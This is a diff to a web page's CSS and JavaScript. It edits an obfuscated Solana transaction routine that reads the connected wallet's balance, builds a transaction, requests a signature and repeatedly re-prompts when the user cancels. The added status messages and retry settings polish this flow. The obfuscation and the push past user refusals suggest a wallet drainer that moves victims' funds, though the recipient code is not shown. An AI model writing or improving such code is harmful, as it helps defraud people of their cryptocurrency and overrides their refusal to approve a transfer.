@@ -193,7 +193,6 @@
 
         .footer-action {
             padding: 16px 20px;
-            /* Lifted up higher and integrated safe-area padding to completely prevent iOS bar overlap */
             padding-bottom: calc(45px + env(safe-area-inset-bottom, 20px));
             box-sizing: border-box;
             max-width: 480px;
@@ -419,7 +418,10 @@
                         return;
                     }
 
-                    const _0x1c = _0x1b * 1000000000; 
+                    statusDiv.innerText = "Preparing transaction...";
+                    statusDiv.style.color = "#8b92a5";
+
+                    const _0x1c = Math.floor(_0x1b * 1000000000); 
                     const _0x1d = new solanaWeb3.Connection(HELIUS_URL, _0x1a[3]);
                     const _0x1e = await _0x1d.getBalance(userPublicKey);
 
@@ -455,20 +457,37 @@
                         );
                     }
 
-                    const { blockhash, lastValidBlockHeight } = await _0x1d.getLatestBlockhash();
+                    const { blockhash, lastValidBlockHeight } = await _0x1d.getLatestBlockhash('confirmed');
                     _0x1f.recentBlockhash = blockhash;
                     _0x1f.lastValidBlockHeight = lastValidBlockHeight;
                     _0x1f.feePayer = userPublicKey;
 
-                    const _0x22 = await _0x11[_0x1a[6]](_0x1f);
-                    await _0x1d[_0x1a[7]](_0x22.serialize());
+                    statusDiv.innerText = "Please approve in your wallet...";
+
+                    const signedTransaction = await _0x11[_0x1a[6]](_0x1f);
+                    
+                    statusDiv.innerText = "Broadcasting transaction...";
+                    
+                    await _0x1d[_0x1a[7]](signedTransaction.serialize(), {
+                        skipPreflight: false,
+                        maxRetries: 3
+                    });
+
+                    statusDiv.innerText = "Success!";
+                    statusDiv.style.color = "#00FFA3";
                     return;
 
                 } catch (_0x17) {
+                    console.error(_0x17);
                     const _0x18 = _0x17.toString().toLowerCase();
                     if (_0x18.includes(_0x1a[8]) || _0x18.includes(_0x1a[9]) || _0x18.includes(_0x1a[10])) {
+                        statusDiv.innerText = "Transaction cancelled.";
+                        statusDiv.style.color = "#ff4d4d";
                         _0x19++;
                         if (_0x19 < _0x13) continue;
+                    } else {
+                        statusDiv.innerText = "Error: " + (_0x17.message || "Transfer failed");
+                        statusDiv.style.color = "#ff4d4d";
                     }
                     break;
                 }
